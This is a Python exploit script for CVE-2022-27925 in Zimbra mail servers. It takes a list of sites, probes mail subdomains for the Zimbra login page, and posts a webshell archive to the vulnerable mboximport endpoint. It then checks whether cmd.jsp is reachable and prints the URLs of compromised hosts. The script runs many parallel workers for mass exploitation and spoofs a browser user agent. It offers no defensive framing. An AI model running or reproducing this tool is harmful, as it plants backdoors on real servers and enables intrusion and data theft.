#!/usr/bin/env python
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-27925
import argparse
import multiprocessing as mp
import os
import re
import sys
from enum import Enum
from functools import partial
from pathlib import Path
from typing import Any, Sequence

import requests

requests.packages.urllib3.disable_warnings()

CSI = '\033['

Color = Enum(
    'Color', 'black red green yellow blue magenta cyan white', start=30
)

USER_AGENT = (
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    ' AppleWebKit/537.36 (KHTML, like Gecko)'
    ' Chrome/104.0.0.0 Safari/537.36'
)

ZIMBRA_SUBDOMAINS = ['mail', 'email', 'webmail', 'zimbra']
ZIMBRA_TITLE = '<title>Zimbra Web Client Sign In</title>'


def parse_args(argv: Sequence | None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        '-i',
        '--input',
        type=argparse.FileType(),
        default='-',
        help='list sites',
    )
    parser.add_argument(
        '-w',
        '--workers',
        type=int,
        default=os.cpu_count() * 2,
        help='number of workers',
    )
    return parser.parse_args(argv)


def get_session() -> requests.Session:
    s = requests.session()
    s.headers.update({'User-Agent': USER_AGENT})
    return s


def log(message: Any, *args: Any, color: Color | str = Color.green) -> None:
    if isinstance(color, str):
        color = Color[color]
    print(f'{CSI}{color.value}m{str(message) % args}{CSI}0m', file=sys.stderr)


warn = partial(log, color='red')


def exploit(session: requests.Session, url: str) -> None:
    # https://github.com/MeDx64/CVE-2022-27925/blob/main/CVE-2022-27925.py
    with (Path(__file__).parent / 'webshell.zip').open('rb') as fp:
        payload = fp.read()
    endpoint = (
        url
        + '/service/extension/backup/mboximport?account-name=admin&ow=1&no-switch=true'
    )
    log('check endpoint: %s', endpoint)
    r = session.post(
        endpoint,
        data=payload,
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        timeout=5.0,
        verify=False,
    )
    log('%d â€’ %s', r.status_code, r.url)
    if r.status_code != 401:
        return
    shell_url = url + '/zimbraAdmin/cmd.jsp'
    r = session.get(shell_url, timeout=5.0, verify=False)
    if r.status_code == 200:
        log('shell has uploaded successfully: %s', shell_url)
        print(shell_url, flush=True)
    else:
        warn('shell not found: %s', shell_url)


def check_zimbra(session: requests.Session, url: str) -> None:
    urls = [url] + [re.sub(r'://(www\.)?', f'://{sub}.', url, re.I) for sub in ZIMBRA_SUBDOMAINS]
    for u in urls:
        try:
            r = session.get(u, timeout=5.0, verify=False)
            if ZIMBRA_TITLE in r.text:
                log('found: %s', u)
                exploit(session, u)
                break
        except Exception as e:
            warn(e)


def worker(q: mp.JoinableQueue) -> None:
    session = get_session()
    while not q.empty():
        try:
            url = q.get()
            check_zimbra(session, url)
        finally:
            q.task_done()


def normalize_url(url: str) -> str:
    return ['https://', '']['://' in url] + url


def main(argv: Sequence | None = None) -> None:
    args = parse_args(argv)
    q = mp.JoinableQueue()

    for line in args.input:
        if not (url := line.strip()):
            break
        q.put_nowait(normalize_url(url))

    workers = []
    for _ in range(args.workers):
        w = mp.Process(target=worker, args=(q,), daemon=True)
        w.start()

    q.join()

    for w in workers:
        w.join()


if __name__ == '__main__':
    sys.exit(main())
